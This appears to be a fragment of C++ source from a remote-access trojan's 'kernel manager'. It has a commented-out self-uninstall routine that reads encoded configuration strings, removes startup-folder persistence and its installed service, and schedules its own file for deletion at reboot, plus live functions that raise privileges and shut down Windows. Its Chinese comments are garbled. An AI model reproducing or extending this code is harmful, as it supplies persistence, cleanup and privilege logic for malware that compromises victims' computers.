	//lstrcat( strWebCam, "\\BWebCam.dll" );
	//DeleteFile(strWebCam);
	//	
	////ɾ�����߼�¼�ļ�
	//TCHAR	strRecordFile[MAX_PATH];
	//GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	//lstrcat(strRecordFile, _T("\\MODIf.html"));
	//DeleteFile(strRecordFile);
	//
	//char	*szInstall = (char *)FindConfigString(CKernelManager::g_hInstance, "OPQR");
	//if (szInstall == NULL)
	//{
	//	return;
	//}

	//char	*szGreen = (char *)FindConfigString(CKernelManager::g_hInstance, "STUV");
	//if (szGreen == NULL)
	//{
	//	return;
	//}
	//
	//if(strstr(szGreen, "K") != NULL)//���������ɫ��װ
	//{
	//	if (strstr(szInstall, "U") != NULL)
	//	{
	//		TCHAR   szPath[MAX_PATH];
	//		SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE);
	//		TCHAR buf3[MAX_PATH];
	//		char FileName[80];
	//		wsprintf(FileName,"%s.exe",szGetGroup);
	//		wsprintf(buf3, "%s\\%s", szPath, FileName);
	//		
	//		char	strTmpPathQ[MAX_PATH];
	//		char	strRandomFileQ[MAX_PATH];
	//		GetTempPath(sizeof(strTmpPathQ), strTmpPathQ);
	//		wsprintf(strRandomFileQ, "%s\\%x.sg", strTmpPathQ, GetTickCount()+57);
	//		MoveFile(buf3, strRandomFileQ);
	//		MoveFileEx(strRandomFileQ, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	//	}
	//	if (strstr(szInstall, "I") != NULL)
	//	{
	//		char	*SerName = (char *)FindConfigString(CKernelManager::g_hInstance, "EFGH");
	//		if (SerName == NULL)
	//		{
	//			return;
	//		}
	//		SerName = (char *)(MyDecode(SerName + 4));  //���ܱ����ܵ��ַ���
	//		//ɾ������
	//		char	*ServerA = NULL;
	//		ServerA = SerName;
	//		SC_HANDLE service, scm;
	//		scm = OpenSCManager(0, 0,SC_MANAGER_CREATE_SERVICE);
	//		service = OpenService(scm, ServerA,SERVICE_ALL_ACCESS | DELETE);
	//		DeleteService(service);
	//	}
	//}

	//CHAR	strServiceDll[MAX_PATH];
	//GetModuleFileName(NULL, strServiceDll, sizeof(strServiceDll));
	//char	strTmpPath[MAX_PATH];
	//char	strRandomFile[MAX_PATH];
	//GetTempPath(sizeof(strTmpPath), strTmpPath);
	//wsprintf(strRandomFile, "%s\\%x.log", strTmpPath, GetTickCount()+357);
	//MoveFile(strServiceDll, strRandomFile);
	//MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	//DelSetInfo(szGetGroup, szGroup, "BITS");//д������Ϣ
	//CreateEvent(NULL, true, false, m_strKillEvent);
	exit(0);
	ExitProcess(0);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}

void CKernelManager::ShutdownWindows(DWORD dwReason)
{
	EnablePrivilege(SE_SHUTDOWN_NAME, TRUE);
	ExitWindowsEx(dwReason, 0);
	EnablePrivilege(SE_SHUTDOWN_NAME, FALSE);
}

BOOL CKernelManager::EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	LookupPrivilegeValue(NULL, lpPrivilegeName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}
